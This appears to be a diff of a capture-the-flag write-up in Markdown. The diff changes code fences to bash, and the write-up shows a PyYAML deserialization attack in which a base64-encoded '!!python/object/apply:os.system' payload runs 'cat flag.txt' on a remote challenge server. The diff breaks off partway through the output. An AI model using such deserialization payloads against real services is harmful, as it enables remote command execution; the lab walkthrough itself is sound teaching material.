@@ -11,7 +11,7 @@ Tags: _misc_
 
 ## Solution
 When connecting to the container we are presented with an small UI:
-```
+```bash
 $ nc 138.68.162.218 32738
 
 <------[TCS]------>
@@ -23,7 +23,7 @@ $ nc 138.68.162.218 32738
 
 First thing is to test what we can do. Create config let's us enter some values and returns the configuration.
 
-```
+```bash
 > 1
 
 - Creating new config -
@@ -38,7 +38,7 @@ Uploading to ship...
 ```
 
 When decoding the base64 string we get some PyYaml.
-```
+```bash
 $ echo "ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICcxJywgYXV0b19jYWxpYnJhdGlvbjogJ29uJywKICBwcm9wdWxzaW9uX3RlbXA6ICcxJywgc29sYXJfYXJyYXlfdGVtcDogJzEnLCB1bml0czogRn0K" | base64 -d
 !!python/object:__main__.Config {IR_spectrometer_temp: '1', auto_calibration: 'on',
   propulsion_temp: '1', solar_array_temp: '1', units: F}
@@ -46,13 +46,13 @@ $ echo "ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6
 
 That looks interesting since we can probably pack our own payload into it.
 
-```
+```bash
 echo -n '!!python/object/apply:os.system ["cat flag.txt"]' | base64
 ISFweXRob24vb2JqZWN0L2FwcGx5Om9zLnN5c3RlbSBbImNhdCBmbGFnLnR4dCJd
 ```
 
 And sure enough, when uploading the payload...
-```
+```bash
 <------[TCS]------>
 [1] Create config
 [2] Load config
